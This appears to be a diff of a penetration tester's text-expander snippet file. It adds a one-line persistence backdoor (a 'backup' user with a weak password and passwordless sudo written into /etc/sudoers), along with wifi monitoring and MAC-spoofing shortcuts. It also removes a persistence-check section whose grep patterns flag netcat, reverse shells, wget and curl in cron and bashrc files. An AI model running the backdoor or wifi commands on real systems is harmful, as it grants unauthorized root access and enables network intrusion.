@@ -90,10 +90,10 @@ matches:
     replace: sudo nmap -sC -sV -v -p- -o nmap {{clipboard}} --min-rate 
 
   - trigger: ":lping"
-    replace: for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+    replace: for i in {1..254} ;do (ping -c {{clipboard}} | grep "bytes from" &) ;done
 
   - trigger: ":wping"
-    replace: for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+    replace: for /L %i in (1 1 254) do ping {{clipboard}} -n 1 -w 100 | find "Reply"
 
   - trigger: ":dirsearch"
     replace: "dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u {{clipboard}}"
@@ -144,7 +144,11 @@ matches:
       stty rows 60 
       stty columns 150
       export TERM=screen
-    
+      
+   - trigger: ":userpersist"
+    replace: |
+      "sudo useradd -m backup && echo "backup:password" | sudo chpasswd && echo 'backup ALL=(ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers"   
+      
   - trigger: ":sshpersist"
     replace: |
       mkdir -p ~/.ssh
@@ -184,19 +188,17 @@ matches:
   - trigger: ":pkill"
     replace: pkill -9 -t pts/
 
-# PERSISTANCE CHECK
+# WIFI
 
-  - trigger: ":users"
-    replace: cat /etc/passwd | grep /*sh
+  - trigger: ":airup"
+    replace: sudo airmon-ng start wlan0
 
-  - trigger: ":sshconfig"
-    replace: cat /etc/ssh/sshd_config | grep -E "PermitRootLogin|AllowUsers|PasswordAuthentication|PermitEmptyPasswords|PubkeyAuthentication" && echo -e "NO NO YES NO\nIF HARDENING RESTART SSH\nsudo systemctl restart sshd"
+  - trigger: ":airodump"
+    replace: sudo airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg
 
-  - trigger: ":ftpconfig"
-    replace: cat /etc/vsftpd.conf | grep -v '^\s*#' | tr -s '\n' && echo -e "\nanonymous_enable NEEDS TO BE NO\nRestart vsftpd after hardening\nsudo systemctl restart vsftpd"
+  - trigger: ":hostname"
+    replace: hostnamectl set-hostname
 
-  - trigger: ":cron"
-    replace: echo "" && sudo find /etc/cron* -type f -exec grep -E '([0-9]{1,3}\.){3}[0-9]{1,3}|nc|netcat|bash -i|/bin/bash|python|perl|ruby|wget|curl' {} \; -exec stat -c "%A %y %n" {} \; && sudo find /var/spool/cron/crontabs -type f -exec grep -E '([0-9]{1,3}\.){3}[0-9]{1,3}|nc|netcat|bash -i|/bin/bash|python|perl|ruby|wget|curl' {} \; -exec stat -c "%A %y %n" {} \; | grep -v '^\s*#'
-
-  - trigger: ":bashrc"
-    replace: echo "" && sudo find / -name '*bashrc' -exec grep -E '([0-9]{1,3}\.){3}[0-9]{1,3}|netcat|bash -i|/bin/bash|python|perl|ruby|wget|curl' {} \; -exec stat -c "%A %y %n" {} \;    
+  - trigger: ":spoofmac"
+    replace: macchanger -A wlan0mon
+    
